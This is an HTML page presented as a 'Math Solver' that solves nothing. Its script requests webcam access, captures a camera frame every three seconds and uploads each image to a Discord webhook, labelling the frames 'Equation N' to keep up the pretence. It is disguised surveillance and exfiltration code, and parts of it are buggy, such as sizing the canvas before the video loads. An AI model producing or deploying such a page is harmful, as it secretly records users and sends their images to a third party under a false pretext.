<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Math Solver</title>
    <style>
      body {
        background-color: #f7f7f7;
        font-family: Arial, sans-serif;
        font-size: 16px;
      }
      h1 {
        color: #003580;
        font-size: 32px;
        text-align: center;
        margin-top: 50px;
      }
      #math-image {
        display: block;
        margin: 0 auto;
        width: 400px;
        height: 300px;
        border: 2px solid #003580;
        border-radius: 10px;
        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
      }
      #math-equation {
        text-align: center;
        margin-top: 20px;
        font-size: 24px;
        color: #003580;
      }
    </style>
  </head>
  <body>
    <h1>Math Solver</h1>
    <img id="math-image" src="" alt="Math Equation">
    <div id="math-equation"></div>
    <script>
      let imageCounter = 1;
      const intervalId = setInterval(captureImage, 3000);

      async function captureImage() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({video: true, width: 400, height: 300});
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          document.body.appendChild(video);
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
          const formData = new FormData();
          formData.append('file', blob, 'math-equation.jpg');
          const xhr = new XMLHttpRequest();
          xhr.open('POST', 'https://discord.com/api/webhooks/1111');
          xhr.send(formData);
          const equation = `Equation ${imageCounter++}`;
          document.getElementById('math-image').src = canvas.toDataURL();
          document.getElementById('math-equation').innerHTML = equation;
        } catch (error) {
          console.log(error.name + ": " + error.message);
        }
      }
    </script>
  </body>
</html>
